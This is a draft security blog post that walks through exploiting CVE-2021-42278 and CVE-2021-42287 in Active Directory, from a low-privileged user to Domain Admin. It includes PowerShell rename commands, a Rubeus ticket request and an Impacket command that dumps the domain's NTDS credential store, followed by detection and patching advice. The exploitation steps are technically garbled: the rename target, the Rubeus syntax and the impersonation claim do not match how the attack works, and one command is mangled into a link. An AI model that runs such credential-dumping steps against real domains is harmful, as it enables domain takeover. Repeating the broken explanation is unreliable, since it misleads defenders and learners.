---
title: Exploiting CVE-2021-42278 & CVE-2021-42287 – From User to Domain Admin
published: 2025-04-18
updated: 2025-04-18
description: 'Simulating a real-world privilege escalation attack using CVE-2021-42278 and CVE-2021-42287 in Active Directory to gain Domain Admin access from a low-privileged user'
image: 'two-cves.webp'
tags: [CVEs]
category: 'Active Directory Attacks'
draft: true 
lang: 'ar-eng'
---

## Table of Contents

1. [Introduction](#cve-2021-42278--cve-2021-42287-from-user-to-domain-admin-simulating)
2. [Why is this Attack Important?](#why-is-this-attack-important)
3. [Vulnerability Overview](#2-vulnerability-overview)  
   - [CVE-2021-42278 – SAMAccountName Spoofing](#cve-2021-42278-samaccountname-spoofing)  
   - [CVE-2021-42287 – Kerberos Privilege Escalation](#cve-2021-42287-kerberos-privilege-escalation)
4. [Lab Setup (Tools + Env)](#3-lab-setup-tools--env)
5. [Step-by-Step Exploitation](#4-step-by-step-exploitation)  
   - [Step 1: Login as a regular user](#step-1-login-as-a-regular-user)  
   - [Step 2: Rename a Computer Object](#step-2-rename-a-computer-object-to-a-user-like-name)  
   - [Step 3: Modify sAMAccountName](#step-3-modify-samaccountname-to-match-user-name)  
   - [Step 4: Request a TGT](#step-4-request-a-tgt-for-the-spoofed-computer)  
   - [Step 5: Impersonate the Domain Controller](#step-5-impersonate-the-domain-controller--perform-dcsync)  
   - [Step 6: Domain Admin Access](#step-6-profit--domain-admin-access)
6. [Detection & Blue Team View](#5-detection--blue-team-view)
7. [Patch & Mitigation Tips](#6-patch--mitigation-tips)
8. [References + Final Thoughts](#7-references--final-thoughts)


## "CVE-2021-42278 && CVE-2021-42287" From User to Domain Admin: Simulating

In the world of **advanced cyber attacks** on Active Directory, there are several vulnerabilities that continue to affect systems even after updates. One such vulnerability duo that caused a lot of concern were **CVE-2021-42278** and **CVE-2021-42287**, discovered in late 2021. These vulnerabilities allow an attacker to escalate from **a low-privileged user to Domain Admin** using **simple tools**.

### `Why is this attack important?`

This attack is unique for several reasons:

- **No misconfigurations required**: The attack relies solely on vulnerabilities within Active Directory itself.
- **Simplicity of exploitation**: By leveraging these built-in vulnerabilities, an attacker can easily escalate to **Domain Admin** rights with minimal effort.

In this post, we will **simulate** this attack in a lab environment using these CVEs, showcasing how they can be exploited on unpatched systems.

### `2. Vulnerability Overview`

### `📌 CVE-2021-42278: SAMAccountName Spoofing`

This vulnerability allows an attacker to spoof the name of a computer account in Active Directory to make it appear as a user account. The idea is that **Active Directory** checks the `sAMAccountName` to determine if the account is a real computer or a user. With this flaw, an attacker can **create a fake computer object** in AD and assign it a name similar to a user.

### `📌 CVE-2021-42287: Kerberos Privilege Escalation`

**CVE-2021-42287** leverages **Kerberos** to escalate privileges. The attacker requests a **TGT (Ticket Granting Ticket)** for the spoofed computer. This ticket allows the attacker to **impersonate the Domain Controller**, which in turn gives them the ability to escalate and gain **Domain Admin** privileges.

---

### 🧪 **3. Lab Setup (Tools + Env)**

To conduct the simulation, the following environment will be used:

| **Component** | **Description** |
| --- | --- |
| **OS** | Windows Server 2019 (unpatched, pre-Nov 2021) |
| **Tools** | Mimikatz, Rubeus, Impacket, KrbRelayUp |
| **User Account** | One low-privileged domain user (`amr.user@corp.local`) |
| **Domain Controller** | Unpatched Domain Controller (pre-Nov 2021 patches) |

---

### `**4. Step-by-Step Exploitation**`

### **Step 1: Login as a regular user**

Let’s assume we have a **low-privileged user** called `amr.user` on the domain `corp.local`. After logging in as the regular user, we proceed with the attack.

### **Step 2: Rename a Computer Object to a User-Like Name**

This is where **CVE-2021-42278** comes into play. We change the name of a computer object to resemble a user name. This can be done via PowerShell:

```basic
Rename-ADObject "CN=WIN10-CLIENT,CN=Computers,DC=corp,DC=local" -NewName "amruser"

```

Now, the `WIN10-CLIENT` computer is renamed to `amruser` in AD.

### **Step 3: Modify `sAMAccountName` to Match User Name**

Next, we modify the **sAMAccountName** of the computer object to match the user name:

```basic
Set-ADComputer -Identity "amruser" -SamAccountName "amruser"

```

### **`Step 4: Request a TGT for the Spoofed Computer`**

Now, using **Rubeus**, we request a **Kerberos Ticket** for the spoofed computer. This ticket will allow us to **impersonate** the Domain Controller:

```basic
rubeus tgtdeleg /user:amruser$ /rc4:<ntlm_hash> /domain:corp.local

```

### **`Step 5: Impersonate the Domain Controller & Perform DCSync`**

At this point, we use **Impacket** to dump **NTDS** from the Domain Controller as if we were the DC:

```basic
[secretsdump.py](http://secretsdump.py/) -k -no-pass CORP/amruser$@dc.corp.local
```

Now, we have **all the user information from the domain** and can escalate our privileges.

**`Step 6: Profit – Domain Admin Access`**

With the user information and passwords obtained from **NTDS.DIT**, we can easily use the proper tools to access Domain Admin accounts or impersonate users with high privileges.

---

### `**5. Detection & Blue Team View**`

**How to Detect This Attack:**
To detect this attack, defenders should look for the following patterns:

- **Event ID 4741**: This event is logged when a **new computer account** is created.
- **Event ID 4781**: This event is logged when a **`sAMAccountName`** is changed.
- **Kerberos TGT Anomalies**: Watch for unusual TGT requests, especially if the account being used is a computer and not a real user.
- **Logon Logs**: Monitor unusual login attempts that could indicate an attacker is spoofing privileges.

---

### **`6. Patch & Mitigation Tips`**

**To Protect Your Domain:**

1. ✅ **Apply November 2021 Patch**: Apply updates to mitigate the vulnerabilities.
2. ✅ **Monitor & Limit Computer Object Modifications**: Restrict who can modify computer object names in AD.
3. ✅ **Audit SAMAccountName Changes**: Perform audits on changes to `sAMAccountName` for any computer objects.
4. ✅ **Limit Access to Domain Controller**: Ensure only authorized users can access the Domain Controller.

### `7. References + Final Thoughts`

**Official Advisories:**

- [CVE-2021-42278 – Microsoft Docs](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
- [CVE-2021-42287 – Microsoft Docs](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)

**Tools Used:**

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Impacket](https://github.com/fortra/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

This attack chain using **CVE-2021-42278** and **CVE-2021-42287** shows how **vulnerable** Active Directory can be in some configurations. The attack does not rely on misconfigurations but on how **AD handles names and Kerberos tickets**.

To conclude, **Active Directory** security needs constant attention, and vulnerabilities like these can allow attackers to compromise entire networks **without needing any misconfiguration**.